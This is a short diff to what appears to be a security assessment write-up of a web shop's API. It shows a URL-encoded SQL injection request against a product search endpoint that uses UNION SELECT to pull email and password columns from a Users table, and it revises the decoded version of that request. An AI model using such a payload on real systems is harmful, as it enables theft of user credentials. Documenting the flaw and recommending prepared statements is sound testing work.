@@ -175,7 +175,7 @@ Use prepared statements and whitelisted search patterns. Never directly put user
 ```
 GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%201%2C%202%2C%203%2C%204%2C%205%2C%206%20FROM%20Users-- HTTP/1.1
 ```
-This is the same as: “q=')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users”
+This is the same as: “')) UNION SELECT id, email, password, 1, 2, 3, 4, 5, 6 FROM Users--HTTP/1.1” But it's url encoded.
 
 ![Screenshot](Pictures/Pic_1.png)
 #### Track Order API
